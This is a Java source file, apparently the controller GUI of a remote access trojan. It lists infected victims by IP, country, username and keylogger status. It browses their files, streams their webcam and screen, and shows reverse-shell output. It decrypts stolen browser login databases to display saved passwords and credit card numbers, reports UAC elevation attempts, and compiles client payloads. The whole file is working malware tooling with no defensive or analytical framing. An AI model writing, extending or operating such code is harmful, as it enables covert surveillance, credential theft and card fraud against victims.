package Utilities;

import Main.Main;
import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import ProgressBar.Bar;
import TableUtils.Credentials.CredentialsManagerGUI;
import Utils.CredentialsDumper;
import Packets.Credentials.AccountCredentials;
import Packets.Credentials.CombinedCredentials;
import Packets.Credentials.CreditCardCredentials;
import TableUtils.FileManager.FileManagerGUI;
import TableUtils.ReverseShell.ReverseShellGUI;
import TableUtils.ScreenStreaming.ScreenStreamerGUI;
import TableUtils.WebcamManager.WebcamGUI;
import Updater.UpdaterInterface;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

public class SwingUpdater implements UpdaterInterface {

    private SystemInformation systemInformation;

    private NetworkInformation networkInformation;

    private FileManagerGUI fileManagerGUI;

    private WebcamGUI webcamGUI;

    private ScreenStreamerGUI screenStreamerGUI;

    private CredentialsManagerGUI credentialsManagerGUI;

    private ReverseShellGUI reverseShellGUI;

    private final ConcurrentHashMap<Byte, Bar<?>> mapOfProgressBars = new ConcurrentHashMap<>();

    private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
        String operatingSystem = jsonObject.getString("win_ver");
        String userProfile = jsonObject.getString("user_profile");
        String homePath = jsonObject.getString("home_path");
        String homeDrive = jsonObject.getString("home_drive");
        String username = jsonObject.getString("username");
        JSONArray userDisksJsonArray = jsonObject.getJSONArray("disks");
        List<String> listOfDisks = userDisksJsonArray.toList().stream()
                .map(Object::toString)
                .toList();
        String tagName = jsonObject.getString("tag_name");
        boolean webcam = jsonObject.getBoolean("webcam");
        boolean keylogger = jsonObject.getBoolean("keylogger");
        String uuid = jsonObject.getString("mutex");
        systemInformation = new SystemInformation(operatingSystem, userProfile, homePath, homeDrive, username, listOfDisks, tagName, webcam, keylogger, uuid);
        String ip = jsonObject.getString("query");
        String internetCompanyName = jsonObject.getString("isp");
        String userContinent = jsonObject.getString("continent");
        String userCountry = jsonObject.getString("country");
        String userRegion = jsonObject.getString("region");
        String userCity = jsonObject.getString("city");
        String userZone = jsonObject.getString("timezone");
        String userCurrency = jsonObject.getString("currency");
        boolean userProxy = jsonObject.getBoolean("proxy");
        networkInformation = new NetworkInformation(ip, internetCompanyName, userContinent, userCountry, userRegion, userCity, userZone, userCurrency, userProxy);
    }

    public void addRowOfNewConnection(JSONObject jsonObject) {
        convertJSON2NetAndSysInfo(jsonObject);
        SwingUtilities.invokeLater(() -> {
            TableModel tableModel = Main.gui.getConnectionsTable().getModel();
            /*int existingClientRow = getPositionOfExisting(identifier, tableModel); // position if exists in JTable
            if (existingClientRow != -1) {  // change state of connection
                tableModel.setValueAt("Connected", existingClientRow, tableModel.getColumnCount() - 1);
            } else { // new connection*/
            String[] tableRow = new String[]{
                    systemInformation.UUID(),
                    networkInformation.IP(),
                    networkInformation.USER_COUNTRY(),
                    systemInformation.TAG_NAME(),
                    systemInformation.USER_NAME(),
                    systemInformation.OPERATING_SYSTEM(),
                    "Connected"
            };
            DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
            defaultTableModel.addRow(tableRow);
            // }
            //if (ServerGUI.isNotifications() && SystemTray.isSupported())
            //  displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
            Main.gui.updateNumOfConnectedClients();
        });
    }

    public void updateDisks(JSONObject jsonObject) {
        JSONArray jsonArray = jsonObject.getJSONArray("disks");
        fileManagerGUI.addDisks(jsonArray.toList().stream()
                .map(Object::toString)
                .toList());
    }


    public void updateDirectory(JSONObject jsonObject) {
        String path = jsonObject.getString("requested_directory");
        List<String> list = new ArrayList<>(Arrays.asList(jsonObject.getString("directory").split("\\|")));
        int divider = list.indexOf("/");
        System.out.println(divider);
        list.remove(divider);
        SwingUtilities.invokeLater(() -> {
            if (list != null) {
                System.out.println();
                if (!list.isEmpty() && list.get(0).equals("ACCESS_DENIED")) {
                    JOptionPane.showMessageDialog(fileManagerGUI.getFileManagerDialog(), "Access denied to this folder",
                            "Access denied", JOptionPane.ERROR_MESSAGE);
                    fileManagerGUI.getStack().pop();
                } else {
                    fileManagerGUI.setDivider(divider);
                    fileManagerGUI.getPathField().setText(path);
                    DefaultTableModel tableModel = (DefaultTableModel) fileManagerGUI.getTable().getModel();
                    tableModel.setRowCount(0);
                    tableModel.addRow(new String[]{"..."});
                    for (int i = 0; i < list.size(); i++) {
                        if (i >= divider) {
                            tableModel.addRow(new String[]{list.get(i), list.get(i + 1)});
                            i++;
                        } else tableModel.addRow(new String[]{list.get(i), ""});

                    }
                    fileManagerGUI.getScrollPane().getVerticalScrollBar().setValue(0);
                }
            } else {
                //  new ClientErrorHandler("Unable to enter directory, connection lost with client",
                //         fileManagerGUI.getFileManagerDialog(),
                //         fileManagerGUI.getStream().getClientSocket());
            }
        });
    }

    private void disableButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(false);
        webcamGUI.getStartButton().setEnabled(false);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableBasicButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(true);
        webcamGUI.getStartButton().setEnabled(true);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableButtons() {
        if (webcamGUI.getBoxOfDevices().getSelectedIndex() != -1) {
            enableBasicButtons();
        } else {
            disableButtons();
        }
    }

    public void updateWebcamDevices(JSONObject jsonObject) {
        List<Object> listOfWebcams = jsonObject.getJSONArray("list_of_webcams").toList();
        SwingUtilities.invokeLater(() -> {
            if (listOfWebcams != null) {
                if (listOfWebcams.isEmpty()) {
                    disableButtons();
                    webcamGUI.getBoxOfDevices().addItem("No webcam found");
                } else {
                    for (Object listOfWebcam : listOfWebcams) {
                        webcamGUI.getBoxOfDevices().addItem((String) listOfWebcam);
                    }
                    enableButtons();
                }
            }
        });

    }

    public void updateFrameOfWebcamStreamer(byte[] data) {
        webcamGUI.setLastFrame(data);
        SwingUtilities.invokeLater(() -> {
            ImageIcon tempIMG = new ImageIcon(data);
            webcamGUI.getWebcamLabel().setIcon(tempIMG);
        });
    }

    public void updateReverseShell(JSONObject jsonObject){
        JTextArea textArea = reverseShellGUI.getTextAreaOfResult();
        textArea.append(jsonObject.getString("result"));
        textArea.setCaretPosition(textArea.getDocument().getLength());

    }

    public void updateFrameOfScreenStreamer(byte[] finalData) {
        ImageIcon tempIMG = new ImageIcon(finalData);
        Image img = tempIMG.getImage();
        screenStreamerGUI.setLastData(finalData);
        Image imgScale = img.getScaledInstance(screenStreamerGUI.getVirtualScreen().getWidth(), screenStreamerGUI.getVirtualScreen().getHeight(), Image.SCALE_SMOOTH);
        SwingUtilities.invokeLater(() -> {
            screenStreamerGUI.getVirtualScreen().setIcon(new ImageIcon(imgScale));
        });
    }

    public void setScreenDimensions(JSONObject jsonObject) {
        List<Object> dimensions = jsonObject.getJSONArray("dimensions").toList();
        screenStreamerGUI.setOriginalScreenDimensions(
                Integer.parseInt(dimensions.get(0).toString()),
                Integer.parseInt(dimensions.get(1).toString())
        );
    }

    public void updateMonitors(JSONObject jsonObject) {
        List<Object> listOfMonitors = jsonObject.getJSONArray("list_of_monitors").toList();
        SwingUtilities.invokeLater(() -> {
            JComboBox<String> comboBox = screenStreamerGUI.getScreenSelector();
            for (Object e : listOfMonitors) {
                comboBox.addItem(e.toString());
            }
        });
    }

    public void updateCredentialsDumper(String path) {
        byte[] secretKeyBytes;
        try {
            secretKeyBytes = Files.readAllBytes(new File(path + "\\Encryption Key").toPath());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        CredentialsDumper credentialsDumper = new CredentialsDumper(secretKeyBytes, path + "\\Login Data", path + "\\Web Data");
        CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
        ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
        ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
        SwingUtilities.invokeLater(() -> {
            for (AccountCredentials e : accountCredentials) {
                Object[] elements = {e.actionUrl(), e.originUrl(), e.username(), e.password(), e.creationDate(), e.lastUsedDate()};
                credentialsManagerGUI.getAccountsTableModel().addRow(elements);
            }
            for (CreditCardCredentials e : creditCardCredentials) {
                Object[] elements = {e.creditCardNumber(), e.expirationMonth(), e.expirationYear(), e.cardHolder()};
                credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
            }
            credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
        });
    }

    public void showPermissionStatus(JSONObject jsonObject) {
        int result = jsonObject.getInt("result");
        SwingUtilities.invokeLater(() -> {
            switch (result) {
                case 1 -> System.out.println("Permissions acepted!");
                //new ClientErrorHandler(
                //"The client accepted admin privileges, restarting client with privileges.",
                //stream.getClientSocket(),
                //JOptionPane.INFORMATION_MESSAGE);
                case 0 -> JOptionPane.showMessageDialog(Main.gui.getMainGUI(),
                        "The client rejected the UAC prompt, no admin privileges where achieved.",
                        "Exception with client", JOptionPane.ERROR_MESSAGE);
                default -> JOptionPane.showMessageDialog(Main.gui.getMainGUI(),
                        "The client has admin privileges, no need to elevate.",
                        "Exception with client", JOptionPane.WARNING_MESSAGE);
            }
            ;
        });
    }

    @Override
    public void showDownloadedFiles(String outputFolder) {
        FolderOpener.open(outputFolder);
    }

    @Override
    public void updateDownloadState(byte id, int read, boolean isLastPacket) {
        Bar<?> bar = mapOfProgressBars.get(id);
        if (bar != null) bar.updateProgress(read, isLastPacket);
    }

    @Override
    public void showResultOfCompilation(int result) {
        switch (result){
            case -1 -> SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null,
                    "Error assembling client, check for windres and try again.",
                    "Error assembling", JOptionPane.ERROR_MESSAGE));
            case -2 -> SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null,
                    "Error compiling client, check your compiler and try again.",
                    "Error compiling", JOptionPane.ERROR_MESSAGE));
            case 0 -> SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(
                    null,
                    "Client compiled successfully!",
                    "Compiler information",
                    JOptionPane.INFORMATION_MESSAGE));
        }

    }

    @Override
    public void showResultOfUnZippingClientFiles(boolean result) {
        if (result) {
            SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "Files have been successfully extracted! ",
                    "Operation completed", JOptionPane.INFORMATION_MESSAGE));

        } else {
            SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "JAR files might be corrupted or JAR " +
                            "doesn't have enough permissions to extract files!",
                    "Error extracting files", JOptionPane.ERROR_MESSAGE));
        }

    }

    @Override
    public SystemInformation getSystemInformation() {
        return systemInformation;
    }

    @Override
    public NetworkInformation getNetworkInformation() {
        return networkInformation;
    }

    public void setFileManagerGUI(FileManagerGUI fileManagerGUI) {
        this.fileManagerGUI = fileManagerGUI;
    }

    public void setWebcamGUI(WebcamGUI webcamGUI) {
        this.webcamGUI = webcamGUI;
    }

    public void setScreenStreamerGUI(ScreenStreamerGUI screenStreamerGUI) {
        this.screenStreamerGUI = screenStreamerGUI;
    }

    public void addProgressBar(byte id, Bar<?> progressBar){
        mapOfProgressBars.put(id, progressBar);
    }

    public void setCredentialsManagerGUI(CredentialsManagerGUI credentialsManagerGUI) {
        this.credentialsManagerGUI = credentialsManagerGUI;
    }

    public void setReverseShellGUI(ReverseShellGUI reverseShellGUI) {
        this.reverseShellGUI = reverseShellGUI;
    }
}
